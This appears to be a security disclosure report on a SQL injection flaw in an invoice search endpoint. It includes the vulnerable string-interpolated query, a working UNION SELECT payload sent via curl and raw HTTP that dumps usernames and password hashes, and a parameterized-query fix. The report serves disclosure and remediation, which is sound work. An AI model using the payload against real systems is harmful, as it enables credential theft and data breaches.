# SQL injection in invoice search leaks the users table

## Summary

The `q` parameter on `GET /invoices/search` goes into the SQL query as a raw template literal, so it isn't a search term anymore — it's part of the query. A `UNION SELECT` reads any table in the database. I pulled every row from `users`, password hashes included, with a single unauthenticated GET.

## Vulnerability details

- **Type / CWE:** SQL injection (CWE-89).
- **Severity:** High. `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = 7.5. Read-only in this PoC; if the driver allows stacked or write queries it climbs.
- **Affected endpoint:** `GET /invoices/search`, parameter `q`.
- **Authentication:** none. The endpoint is reachable without a session.

## Description

The handler builds its SQL like this:

```ts
const rows = db
  .prepare(`SELECT id, description, amount FROM invoices WHERE description LIKE '%${q}%'`)
  .all();
```

`q` is interpolated straight into the string, inside the quotes, before anything is parsed. So I can close the string, bolt on a `UNION SELECT` that returns three columns, and comment out the trailing `%'`. The database happily unions my rows into the invoice results. The three columns I select land in the `id`, `description`, and `amount` fields of the JSON response, which gives me a clean channel to read whatever I want.

## Steps to reproduce

1. Send a search request with a `UNION`-based payload in `q`:
   ```bash
   curl -G 'http://localhost:3000/invoices/search' \
     --data-urlencode "q=x%' UNION SELECT password, username, 0 FROM users -- "
   ```
2. Read the response. Each `users` row comes back as one "invoice", with the password hash sitting in the `id` field and the username in `description`.

## Proof of concept

Request:
```
GET /invoices/search?q=x%25'%20UNION%20SELECT%20password,%20username,%200%20FROM%20users%20--%20 HTTP/1.1
Host: localhost:3000
```

Response (trimmed):
```json
[
  { "id": "$2b$10$Q9k1sJ0oXfakehashalice...", "description": "alice", "amount": 0 },
  { "id": "$2b$10$Z2m4tK1pYfakehashbob...",   "description": "bob",   "amount": 0 }
]
```

The `id` field is holding bcrypt hashes from `users`. That column is never supposed to contain anything but an invoice id, which is the tell that the query shape was rewritten.

## Impact

Any anonymous visitor can read arbitrary tables. In this app that means the full `users` table with password hashes, plus every tenant's invoices regardless of who owns them. Hashes can be cracked offline; even un-cracked, the presence of the whole auth table is a reportable breach. The same primitive reads any other table the database user can see (sessions, tokens, PII), so the practical ceiling is "everything in the database," not just invoices. For EU users this is a GDPR-reportable incident.

## Remediation

Parameterize. Bind `q` as a value so the driver never parses it as SQL:

```ts
const q = String(req.query.q ?? '');
db.prepare('SELECT id, description, amount FROM invoices WHERE description LIKE ?').all(`%${q}%`);
```

The `?` placeholder keeps the query shape fixed; the wildcards live in the bound value, so `%` and `'` in user input are just characters. No allowlist or escaping needed, and the LIKE search still works.

## References

- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP Top 10: A03:2021 Injection
